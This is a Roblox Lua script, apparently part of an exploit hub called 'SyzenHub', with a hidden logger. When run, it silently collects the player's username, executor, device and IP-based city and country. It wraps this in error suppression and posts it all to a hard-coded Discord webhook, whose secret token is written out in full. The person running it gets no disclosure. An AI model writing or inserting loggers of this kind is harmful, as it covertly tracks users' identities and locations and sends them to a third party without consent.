local HttpService = game:GetService("HttpService")

local url = "https://discord.com/api/webhooks/1386352896899284992/wIeRGYiwZmYRK7g5z1W-wsFdSMjtM02lm8qKifvWmMQeUA2V44z8NjSURPN4UInDXzlS"

pcall(function()
    local user = game.Players.LocalPlayer
    local username = user.Name
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local device = string.match(game:GetService("UserInputService").TouchEnabled and tostring(user.OsPlatform or "Mobile") or tostring(user.OsPlatform or "PC"), "[%w%d-_]+")
    local deviceName = (getidentity and getidentity().device or getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown Device"
    local city, country = "Unknown", "Unknown"

    -- Get city and country from IP API
    local success, response = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        city = data.city or "Unknown"
        country = data.country or "Unknown"
    end

    -- 12-hour time
    local function get12HourTime()
        local hour = tonumber(os.date("%I"))
        local min = os.date("%M")
        local ampm = os.date("%p")
        return hour .. ":" .. min .. " " .. ampm
    end

    -- Final log data
    local embed = {
        ["title"] = "🟢 SyzenHub Script Executed",
        ["fields"] = {
            { name = "👤 Username", value = username, inline = true },
            { name = "🧠 Executor", value = executor, inline = true },
            { name = "📱 Device", value = deviceName, inline = true },
            { name = "🌍 Location", value = city .. ", " .. country, inline = true },
            { name = "🕒 Time", value = get12HourTime(), inline = true }
        },
        ["color"] = 65280
    }

    local data = {
        ["embeds"] = {embed},
        ["username"] = "Syzen Logger"
    }

    local payload = HttpService:JSONEncode(data)

    syn.request({
        Url = url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = payload
    })
end)